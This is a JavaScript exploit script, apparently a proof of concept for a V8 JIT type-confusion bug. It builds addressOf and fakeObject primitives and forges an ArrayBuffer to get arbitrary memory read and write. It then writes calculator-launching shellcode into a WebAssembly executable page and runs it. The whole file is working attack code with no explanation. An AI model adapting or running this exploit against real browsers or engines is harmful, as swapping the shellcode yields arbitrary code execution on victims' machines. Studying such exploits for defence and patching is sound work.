// Helper function start
var buf = new ArrayBuffer(0x8);
var dv = new DataView(buf);

function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }
function p64f(h,l) {
   dv.setUint32(0,l,true);
   dv.setUint32(0x4,h,true);
   return dv.getFloat64(0,true);
}

function u64_l(value) {
   dv.setFloat64(0,value,true);
   return dv.getUint32(0,true);
}

function u64_h(value) {
   dv.setFloat64(0,value,true);
   return dv.getUint32(4,true);
}

// Helper function end

function addressOf(obj) {
   
   function addressOf_opt(dict,f) {
      var x = dict.a;
      f(dict);
      return dict.a;
   }
   
   var double_dict = {a:1.1};
   
   for (var i=0;i<0x20000;i++) {
      addressOf_opt(double_dict,(o)=>1);
      addressOf_opt(double_dict,(o)=>2);
      addressOf_opt(double_dict,(o)=>3);
   }
   
   var x = addressOf_opt(double_dict,(o)=>{o.a = obj});
   return [u64_h(x), u64_l(x) - 0x1];
}

function addressOf2(obj) {
   function addressOf2_opt(dict,f) {
      var x = dict.a2;
      f(dict);
      return dict.a2;
   }
   
   var double_dict2 = {a2:1.1};
   
   for (var i=0;i<0x20000;i++) {
      addressOf2_opt(double_dict2,(o)=>1);
      addressOf2_opt(double_dict2,(o)=>2);
      addressOf2_opt(double_dict2,(o)=>3);
   }
   var x = addressOf2_opt(double_dict2,(o)=>{o.a2 = obj});
   return [u64_h(x) ,u64_l(x) - 0x1];
}


function fakeObject(addr_h,addr_l) {
   function fakeObject_opt(dict, f, addr) {
      var x = dict.b;
      f(dict);
      dict.b = addr;
      return dict;
   }
   
   var obj = {};
   var obj_dict = {b:2.2};
   
   for (var i=0;i<0x20000;i++) {
      fakeObject_opt(obj_dict,(o)=>1,1.1);
      fakeObject_opt(obj_dict,(o)=>2,2.2);
      fakeObject_opt(obj_dict,(o)=>3,3.3);
   }
   var obj1 = fakeObject_opt(obj_dict, (o)=>{o.b = obj;}, p64f(addr_h, addr_l + 0x1)).b;
   return obj1;
}

//gc();gc();
const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
// pop calc shellcode
var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;
var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
gc();gc(); // move above address to old space

var d = addressOf(faker);
var faker_addr_h = d[0];
var faker_addr_l = d[1];

print('faker_addr = 0x'+faker_addr_h.toString(16) + faker_addr_l.toString(16));

d = addressOf2(func);
var wasm_shellcode_ptr_addr_h = d[0];
var wasm_shellcode_ptr_addr_l = d[1];
print('wasm_shellcode_ptr = 0x' + wasm_shellcode_ptr_addr_h.toString(16) + wasm_shellcode_ptr_addr_l.toString(16));

//fake a ArrayBuffer's Map
faker[0] = p64f(0,0);
faker[1] = p64f(0x001900c6, 0x0f00000a);
faker[2] = p64f(0, 0x082003ff);
faker[3] = p64f(0,0);

//fake a ArrayBuffer
faker[4] = p64f(faker_addr_h, faker_addr_l+0x30+0x1); // pointer to faker[0] fake map 
faker[5] = p64f(0,0); //properties
faker[6] = p64f(0,0); //elements
faker[7] = p64f(0x1000,0); //length
faker[8] = p64f(wasm_shellcode_ptr_addr_h, wasm_shellcode_ptr_addr_l+0x38); // address of backward storage, not a pointer
faker[9] = p64f(0,0);

print('map = 0x' + faker_addr_h.toString(16) + (faker_addr_h+0x30).toString(16));
print('arb_ArrayBuffer = 0x' + faker_addr_h.toString(16) + (faker_addr_h+0x50).toString(16));

var arb_ArrayBuffer = fakeObject(faker_addr_h, faker_addr_l+0x50);
var adv = new DataView(arb_ArrayBuffer);
// leak shellcode address, the rwx region
d = adv.getFloat64(0,true);
var wasm_shellcode_addr_h = u64_h(d);
var wasm_shellcode_addr_l = u64_l(d) + 0x60 -1; 

print('wasm_shellcode_addr = 0x' + wasm_shellcode_addr_h.toString(16) + wasm_shellcode_addr_l.toString(16));
faker[8] = p64f(wasm_shellcode_addr_h, wasm_shellcode_addr_l);

for (var i=0;i<shellcode.length;i++) {
   adv.setUint32(i*4,shellcode[i],true);
}

func();
